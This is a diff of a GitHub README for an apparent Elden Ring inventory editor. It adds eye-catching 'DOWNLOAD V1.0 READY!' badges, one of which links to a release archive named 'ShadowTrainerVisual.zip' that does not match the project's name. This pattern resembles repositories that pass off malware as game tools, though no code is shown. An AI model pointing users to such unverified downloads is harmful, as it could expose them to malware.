@@ -4,8 +4,11 @@
 
 [![DOWNLOAD v1.0](https://img.shields.io/badge/DOWNLOAD%20v1.0-READY!-brightgreen?style=for-the-badge&logo=windows)](https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/download/elden-ring/ShadowTrainerVisual.zip)  
 [![ALL RELEASES](https://img.shields.io/badge/ALL%20RELEASES-blue?style=for-the-badge)](https://github.com/Rendi-18/EldenRing-Player-Inventory-Editor/releases/tag/elden-ring)   
-[VGTimes](https://vgtimes.ru/games/elden-ring/files/93022-elden-ring-player-and-inventory-editor.html)
-
+<p align="center">
+  <a href="https://vgtimes.ru/games/elden-ring/files/93022-elden-ring-player-and-inventory-editor.html" target="_blank">
+    <img src="https://img.shields.io/badge/DOWNLOAD%20V1.0-READY!-gradient?style=for-the-badge&logo=git&color=0f0f0f,28a745&logoColor=white&labelColor=000000">
+  </a>
+</p>
 MIT License • Open Source
 
 **Updated: March 17, 2026**
